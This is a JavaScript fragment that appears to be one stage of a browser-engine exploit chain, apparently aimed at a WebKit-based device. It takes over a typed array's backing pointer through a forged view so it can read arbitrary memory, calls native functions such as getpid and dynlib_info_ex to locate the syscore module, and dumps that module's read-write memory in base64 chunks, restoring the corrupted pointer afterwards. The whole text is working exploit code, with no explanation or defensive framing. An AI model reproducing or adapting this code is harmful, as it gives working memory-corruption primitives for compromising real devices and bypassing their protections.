var results;
var phase="preflight";
try {
  var state=window.__fw14ArrayState;
  var plan=window.__fw14NativePlan;
  var native=window.__fw14NativeInvoke;
  if (!state || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !plan || !plan.store || !plan.pivot || !plan.stack || !plan.frame ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      !native || !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      state.array[0]!==state.a)
    throw new Error("current_page_plan_missing");
  var pid0=native.call("getpid",[]);
  if (pid0.high!==0 || pid0.value<1 || pid0.value>100000)
    throw new Error("pid_control_invalid");
  var infoFrame=native.frame;
  var infoAddress=native.frameAddress;
  if (infoFrame.length<0x700 || infoAddress<0x200000000 ||
      infoAddress>=0x900000000)
    throw new Error("owned_frame_invalid");
  var infoOriginal=Array.from(infoFrame.subarray(0x300,0x300+0x1a8));
  var infoDv=new DataView(infoFrame.buffer,infoFrame.byteOffset,
    infoFrame.byteLength);
  var syscoreBase=0;
  try {
    infoFrame.fill(0,0x300,0x300+0x1a8);
    infoDv.setUint32(0x300,0x1a8,true);
    infoDv.setUint32(0x304,0,true);
    var info=native.call("dynlib_info_ex",[28,0,infoAddress+0x300]);
    if (info.value!==0)
      throw new Error("module_info_failed");
    var lo=infoDv.getUint32(0x300+0x110,true);
    var hi=infoDv.getUint32(0x300+0x114,true);
    syscoreBase=hi*0x100000000+lo;
  } finally {
    for (var ix=0;ix<infoOriginal.length;ix++)
      infoFrame[0x300+ix]=infoOriginal[ix];
  }
  if (syscoreBase<0x800000000 || syscoreBase>=0x900000000 ||
      syscoreBase%4096!==0)
    throw new Error("syscore_base_invalid");
  var rw=syscoreBase+0xc000;
  var part=window.__fw14SyscoreRwDumpPartV1;
  if (part===undefined) part=0;
  if (!Number.isInteger(part) || part<0 || part>7)
    throw new Error("dump_part_out_of_range");
  var forged=state.view;
  var carrier=state.ownedTypedView;
  if (carrier.length!==65536 || carrier[0]!==0x31 || carrier[7]!==0xa8)
    throw new Error("carrier_canary_changed");
  function bytesAt(index,count) {
    var bytes=[];
    for (var i=0;i<count;i++) bytes.push(forged[index+i]);
    return bytes;
  }
  function valueOf(bytes) {
    var value=0;
    for (var i=bytes.length-1;i>=0;i--) value=value*256+bytes[i];
    return value;
  }
  function pointerBytes(value) {
    var bytes=[];
    for (var i=0;i<8;i++)
      bytes.push(Math.floor(value/Math.pow(2,8*i))&255);
    return bytes;
  }
  var objectWord;
  try {
    state.array[0]=carrier;
    objectWord=valueOf(bytesAt(state.index,8));
  } finally {
    state.array[0]=state.a;
  }
  var slot=objectWord-state.calibratedViewBase+8;
  if (!Number.isSafeInteger(slot) || slot<0 || slot+8>=16777216)
    throw new Error("carrier_slot_outside_view");
  var original=bytesAt(slot,8);
  function same(a,b) {
    if (a.length!==b.length) return false;
    for (var i=0;i<a.length;i++) if (a[i]!==b[i]) return false;
    return true;
  }
  function readAt(address,count) {
    var pointer=pointerBytes(address);
    try {
      for (var i=0;i<8;i++) forged[slot+i]=pointer[i];
      var bytes=[];
      for (var j=0;j<count;j++) bytes.push(carrier[j]);
      return bytes;
    } finally {
      for (var k=0;k<8;k++) forged[slot+k]=original[k];
    }
  }
  function encodeRange(bytes,start,end) {
    var text="";
    for (var i=start;i<end;i++) text+=String.fromCharCode(bytes[i]);
    return btoa(text);
  }
  phase="mapped_rw_read";
  if (api && typeof api.markSync==="function")
    api.markSync("syscore_rw_dump_preflight");
  var relativeOffset=part*0x900;
  var length=Math.min(0x900,0x4000-relativeOffset);
  var bytes=readAt(rw+relativeOffset,length);
  var pid1=native.call("getpid",[]);
  var restored=same(bytesAt(slot,8),original) &&
    carrier[0]===0x31 && carrier[7]===0xa8 &&
    state.array[0]===state.a &&
    Math.abs(Math.expm1(1)-1.718281828459045)<=1e-12 &&
    pid1.value===pid0.value && pid1.high===0;
  if (!restored) throw new Error("carrier_not_restored");
  var checks=[];
  for (var half=0;half<2;half++) {
    var start=half*1152;
    var details={offset:relativeOffset+start,restored:restored,
      rw_base:rw,self_pid:pid1.value};
    for (var chunk=0;chunk<3;chunk++) {
      var at=start+chunk*384;
      details["b"+chunk]=at<length?
        encodeRange(bytes,at,Math.min(at+384,length)):"";
    }
    checks.push({id:half===0?"syscore_rw_dump_a_v1":
      "syscore_rw_dump_b_v1",status:"pass",details:details});
  }
  window.__fw14SyscoreRwDumpPartV1=part+1;
  if (api && typeof api.markSync==="function")
    api.markSync("syscore_rw_dump_restored");
  results=checks;
} catch (error) {
  results=[{id:"syscore_rw_dump_a_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}},
    {id:"syscore_rw_dump_b_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}}];
}
return results;
